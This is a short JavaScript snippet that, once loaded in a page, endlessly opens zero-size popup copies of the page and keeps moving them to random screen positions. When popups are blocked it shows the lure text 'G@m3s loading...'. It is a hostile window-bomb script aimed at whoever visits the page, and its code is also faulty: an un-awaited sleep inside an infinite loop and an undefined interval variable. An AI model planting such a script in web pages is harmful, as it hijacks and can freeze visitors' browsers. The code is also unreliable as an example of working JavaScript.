function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function moveWindows() {
  while (true) {
    let newWindow = window.open(location.href, "_blank", "width=0,height=0");

    if (!newWindow || newWindow.closed || typeof newWindow.closed == "undefined") {
      document.querySelector("h1").innerHTML =
        "G@m3s loading...";
      clearInterval(interval);
    }

    let windowX = Math.random() * window.screen.availWidth;
    let windowY = Math.random() * window.screen.availHeight;

    const frame = function () {
      windowX = Math.random() * window.screen.availWidth;
      windowY = Math.random() * window.screen.availHeight;
      newWindow.moveTo(windowX, windowY);

      requestAnimationFrame(frame);
    };
    frame();
    sleep(100);
  }
}

setTimeout(moveWindows, 1000);